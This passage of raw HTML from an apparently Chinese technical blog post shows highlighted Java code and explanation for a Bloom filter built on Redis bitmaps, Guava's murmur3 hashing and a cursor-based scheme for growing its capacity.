class=\"crayon-t\">String</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">string</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">numHashFunctions</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">RedisBitmaps </span><span class=\"crayon-v\">bits</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1c7251545973-3\"><span class=\"crayon-h\">        </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bitSize</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bits</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">bitSize</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1c7251545973-4\"><span class=\"crayon-h\">        </span><span class=\"crayon-t\">byte</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bytes</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Hashing</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">murmur3_128</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">hashString</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">string</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Charsets</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">UTF_8</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">asBytes</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1c7251545973-5\"><span class=\"crayon-h\">        </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">hash1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">lowerEight</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">bytes</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1c7251545973-6\"><span class=\"crayon-h\">        </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">hash2</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">upperEight</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">bytes</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1c7251545973-7\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1c7251545973-8\"><span class=\"crayon-h\">        </span><span class=\"crayon-t\">boolean</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bitsChanged</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1c7251545973-9\"><span class=\"crayon-h\">        </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">combinedHash</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">hash1</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1c7251545973-10\"><span class=\"crayon-c\">//        for (int i = 0; i &lt; numHashFunctions; i++) {</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1c7251545973-11\"><span class=\"crayon-c\">//            bitsChanged |= bits.set((combinedHash &amp; Long.MAX_VALUE) % bitSize);</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1c7251545973-12\"><span class=\"crayon-c\">//            combinedHash += hash2;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1c7251545973-13\"><span class=\"crayon-c\">//        }</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1c7251545973-14\"><span class=\"crayon-h\">        </span><span class=\"crayon-t\">long</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">offsets</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">long</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">numHashFunctions</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1c7251545973-15\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">numHashFunctions</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1c7251545973-16\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">offsets</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">combinedHash</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">Long</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">MAX_VALUE</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bitSize</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1c7251545973-17\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">combinedHash</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">hash2</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1c7251545973-18\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1c7251545973-19\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">bitsChanged</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bits</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">set</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">offsets</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1c7251545973-20\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">bits</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">ensureCapacityInternal</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-c\">//自动扩容</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1c7251545973-21\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bitsChanged</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1c7251545973-22\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1c7251545973-23\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1c7251545973-24\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">@</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Override</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1c7251545973-25\"><span class=\"crayon-e\">    </span><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">boolean</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">mightContain</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">String</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">object</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">numHashFunctions</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">RedisBitmaps </span><span class=\"crayon-v\">bits</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1c7251545973-26\"><span class=\"crayon-h\">        </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bitSize</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bits</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">bitSize</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1c7251545973-27\"><span class=\"crayon-h\">        </span><span class=\"crayon-t\">byte</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bytes</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Hashing</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">murmur3_128</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">hashString</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">object</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Charsets</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">UTF_8</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">asBytes</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1c7251545973-28\"><span class=\"crayon-h\">        </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">hash1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">lowerEight</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">bytes</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1c7251545973-29\"><span class=\"crayon-h\">        </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">hash2</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">upperEight</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">bytes</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1c7251545973-30\"><span class=\"crayon-h\">        </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">combinedHash</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">hash1</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1c7251545973-31\"><span class=\"crayon-c\">//        for (int i = 0; i &lt; numHashFunctions; i++) {</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1c7251545973-32\"><span class=\"crayon-c\">//            if (!bits.get((combinedHash &amp; Long.MAX_VALUE) % bitSize)) {</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1c7251545973-33\"><span class=\"crayon-c\">//                return false;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1c7251545973-34\"><span class=\"crayon-c\">//            }</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1c7251545973-35\"><span class=\"crayon-c\">//            combinedHash += hash2;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1c7251545973-36\"><span class=\"crayon-c\">//        }</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1c7251545973-37\"><span class=\"crayon-c\">//        return true;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1c7251545973-38\"><span class=\"crayon-h\">        </span><span class=\"crayon-t\">long</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">offsets</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">long</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">numHashFunctions</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1c7251545973-39\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">numHashFunctions</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1c7251545973-40\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">offsets</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">combinedHash</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">Long</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">MAX_VALUE</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bitSize</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1c7251545973-41\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">combinedHash</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">hash2</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1c7251545973-42\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1c7251545973-43\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bits</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">get</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">offsets</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1c7251545973-44\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0078 seconds] -->\r\n<p>最后，也是最重要的RedisBitmaps，其中bitSize用了Guava布隆过滤器中计算Long型数组长度的方法，得到bitSize之后使用setbit命令初始化一个全部为0的位数组。get(long offset)和set(long offset)，这两个与Guava布隆过滤器中的逻辑类似，这里就不再赘述了，而get(long[] offsets)方法中，所有的offset要与每一个cursor对应的Bitmaps进行判断，若全部命中，那么这个元素就可能存在于该Bitmaps，反之若不能完全命中，则表示该元素不存在于任何一个Bitmaps，所以当满足这个条件，在set(long[] offsets)方法中，就可以插入到当前key的Bitmaps中了。</p>\n<p>在ensureCapacityInternal方法，判断需要扩容的条件是bitCount*2&gt;bitSize，bitCount表示一个Bitmaps中“1”出现的个数，也就是当“1”出现的个数超过总数的一半时，进行扩容操作——首先使用incr命令对cursor自增，然后使用新的key创建一个新的Bitmaps。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f39e8bb1cd810444680\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div><span class=\"crayon-language\">Java</span></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nclass RedisBitmaps {\r\n\r\n    private static final String BASE_KEY = \"bloomfilter\";\r\n    private static final String CURSOR = \"cursor\";\r\n\r\n    private JedisUtils jedisUtils;\r\n    private long bitSize;\r\n\r\n    RedisBitmaps(long bits) {\r\n        this.jedisUtils = new JedisUtils();\r\n        this.bitSize = LongMath.divide(bits, 64, RoundingMode.CEILING) * Long.SIZE;//位数组的长度，相当于n个long的长度\r\n        if (bitCount() == 0) {\r\n            jedisUtils.execute((jedis -&gt; jedis.setbit(currentKey(), bitSize - 1, false)));\r\n        }\r\n    }\r\n\r\n   boolean get(long[] offsets) {\r\n        for (long i = 0; i &lt; cursor() + 1; i++) {\r\n            final long cursor = i;\r\n            //只要有一个cursor对应的bitmap中，offsets全部命中，则表示可能存在\r\n            boolean match = Arrays.stream(offsets).boxed()\r\n                    .map(offset -&gt; jedisUtils.execute(jedis -&gt; jedis.getbit(genkey(cursor), offset)))\r\n                    .allMatch(b -&gt; (Boolean) b);\r\n            if (match)\r\n                return true;\r\n        }\r\n        return false;\r\n    }\r\n\r\n    boolean get(final long offset) {\r\n        return jedisUtils.execute(jedis -&gt; jedis.getbit(currentKey(), offset));\r\n    }\r\n\r\n    boolean set(long[] offsets) {\r\n        if (cursor() &gt; 0 &amp;&amp; get(offsets)) {\r\n            return false;\r\n        }\r\n        boolean bitsChanged = false;\r\n        for (long offset : offsets)\r\n            bitsChanged |= set(offset);\r\n        return bitsChanged;\r\n    }\r\n\r\n    boolean set(long offset) {\r\n        if (!get(offset)) {\r\n            jedisUtils.execute(jedis -&gt; jedis.setbit(currentKey(), offset, true));\r\n            return true;\r\n        }\r\n        return false;\r\n    }\r\n\r\n    long bitCount() {\r\n        return jedisUtils.execute(jedis -&gt; jedis.bitcount(currentKey()));\r\n    }\r\n\r\n    long bitSize() {\r\n        return this.bitSize;\r\n    }\r\n\r\n    private String currentKey() {\r\n        return genkey(cursor());\r\n    }\r\n\r\n    private String genkey(long cursor) {\r\n        return BASE_KEY + \"-\" + cursor;\r\n    }\r\n\r\n    private Long cursor() {\r\n        String cursor = jedisUtils.execute(jedis -&gt; jedis.get(CURSOR));\r\n        return cursor == null ? 0 : Longs.tryParse(cursor);\r\n    }\r\n\r\n    void ensureCapacityInternal() {\r\n        if (bitCount() * 2 &gt; bitSize())\r\n            grow();\r\n    }\r\n\r\n    void grow() {\r\n        Long cursor = jedisUtils.execute(jedis -&gt; jedis.incr(CURSOR));\r\n        jedisUtils.execute((jedis -&gt; jedis.setbit(genkey(cursor), bitSize - 1, false)));\r\n    }\r\n\r\n    void reset() {\r\n        String[] keys = LongStream.range(0, cursor() + 1).boxed().map(this::genkey).toArray(String[]::new);\r\n        jedisUtils.execute(jedis -&gt; jedis.del(keys));\r\n        jedisUtils.execute(jedis -&gt; jedis.set(CURSOR, \"0\"));\r\n        jedisUtils.execute(jedis -&gt; jedis.setbit(currentKey(), bitSize - 1, false));\r\n    }\r\n\r\n    private PipelineExecutor apply(PipelineExecutor executor) {\r\n        return executor;\r\n    }\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-29\">29</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-30\">30</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-31\">31</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-32\">32</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-33\">33</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-34\">34</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-35\">35</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-36\">36</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-37\">37</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-38\">38</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-39\">39</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-40\">40</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-41\">41</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-42\">42</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-43\">43</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-44\">44</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-45\">45</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-46\">46</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-47\">47</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-48\">48</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-49\">49</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-50\">50</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-51\">51</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-52\">52</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-53\">53</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-54\">54</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-55\">55</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-56\">56</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-57\">57</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-58\">58</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-59\">59</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-60\">60</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-61\">61</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-62\">62</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-63\">63</div><div class=\"crayon-num crayon-striped-num\" 